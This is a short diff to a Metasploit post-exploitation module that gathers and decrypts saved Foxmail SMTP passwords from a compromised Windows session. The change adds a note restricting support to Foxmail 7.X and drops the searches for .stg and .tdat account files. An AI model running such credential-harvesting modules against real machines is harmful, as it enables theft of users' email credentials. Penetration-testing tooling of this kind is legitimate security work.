@@ -12,6 +12,7 @@ class MetasploitModule < Msf::Post
         info,
         'Name' => 'Windows Gather Foxmail Passwords',
         'Description' => %q{
+          The module only supports Foxmail version 7.X.
           The module will decrypt the password of any SMTP credentials that have been saved in Foxmail,
           using the file at Storage\<email>\Accounts\Account.rec0 in the installation directory of Foxmail.
           Once the ciphertext has been obtained, the password is decrypted using the research from jacobsoo
@@ -56,8 +57,6 @@ class MetasploitModule < Msf::Post
     session.fs.dir.foreach(fpath) do |mail_addr|
       account_path = "#{fpath}\\#{mail_addr}\\Accounts\\Account"
       account_paths.push("#{account_path}.rec0") if session.fs.file.exist?("#{account_path}.rec0")
-      account_paths.push("#{account_path}.stg") if session.fs.file.exist?("#{account_path}.stg")
-      account_paths.push("#{account_path}.tdat") if session.fs.file.exist?("#{account_path}.tdat")
     end
     tbl = []
     print_status("Search account files on #{fpath}")
